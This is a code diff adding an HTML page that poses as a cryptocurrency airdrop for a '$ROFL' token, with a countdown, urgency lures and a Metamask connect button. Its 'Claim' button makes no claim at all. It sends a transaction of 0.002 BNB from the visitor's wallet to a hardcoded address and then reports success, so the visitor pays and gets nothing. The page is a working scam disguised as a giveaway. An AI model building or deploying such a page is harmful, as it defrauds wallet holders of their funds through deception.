@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Airdrop Website</title>
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+  <style>
+    #metamask-connect {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      font-size: 14px;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container mt-5">
+    <h1 class="text-center mb-4">Airdrop Website</h1>
+    <div id="countdown"></div>
+    <div class="text-center">
+      <h3>Airdrop of 210,000,000,000,000 $ROFL! 🎉</h3>
+      <p class="mt-2">🔒 Exclusive for the first 2000 participants. 🔥👀</p>
+      <p>Each participant will receive 105,000,000,000 $ROFL 🚀</p>
+      <p>To Claim:</p>
+      <ol>
+        <li>Like & Retweet Twitter Post</li>
+        <li><button id="claim-button" class="btn btn-primary">Claim</button></li>
+      </ol>
+    </div>
+
+    <div id="result" class="mt-4"></div>
+  </div>
+
+  <button id="metamask-connect" class="btn btn-primary">Connect Metamask</button>
+
+  <script src="https://cdn.ethers.io/lib/ethers-5.5.4.min.js"></script>
+  <script>
+    document.getElementById('metamask-connect').addEventListener('click', async () => {
+      if (typeof window.ethereum !== 'undefined') {
+        try {
+          await window.ethereum.request({
+            method: 'wallet_requestPermissions',
+            params: [{ eth_accounts: {} }],
+          });
+          displayResult('Connected to Metamask');
+        } catch (error) {
+          console.error(error);
+          displayResult('Failed to connect to Metamask');
+        }
+      } else {
+        displayResult('Metamask not found');
+      }
+    });
+
+    document.getElementById('claim-button').addEventListener('click', async () => {
+      try {
+        await ethereum.request({
+          method: 'eth_sendTransaction',
+          params: [{
+            from: ethereum.selectedAddress,
+            to: '0xD9E818f75c948D11fBFFD65bFC626ea29a1f583b',
+            value: '0x2C68AF0BB140000', // 0.002 BNB in wei
+          }],
+        });
+        displayResult('Payment sent successfully');
+      } catch (error) {
+        console.error(error);
+        displayResult('Failed to send payment');
+      }
+    });
+
+    function displayResult(message) {
+      const resultDiv = document.getElementById('result');
+      resultDiv.innerText = message;
+    }
+
+    function updateCountdown() {
+      const endDate = new Date('2023-07-01T00:00:00Z'); // Set the Airdrop end date here
+      const now = new Date();
+      const timeRemaining = endDate.getTime() - now.getTime();
+
+      if (timeRemaining <= 0) {
+        document.getElementById('countdown').innerText = 'Airdrop has ended!';
+        document.getElementById('claim-button').setAttribute('disabled', 'disabled');
+        return;
+      }
+
+      const days = Math.floor(timeRemaining / (1000 * 60 * 60 * 24));
+      const hours = Math.floor((timeRemaining % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+      const minutes = Math.floor((timeRemaining % (1000 * 60 * 60)) / (1000 * 60));
+      const seconds = Math.floor((timeRemaining % (1000 * 60)) / 1000);
+
+      document.getElementById('countdown').innerText = `Countdown: ${days}d ${hours}h ${minutes}m ${seconds}s`;
+
+      setTimeout(updateCountdown, 1000);
+    }
+
+    updateCountdown();
+  </script>
+</body>
+
+</html>
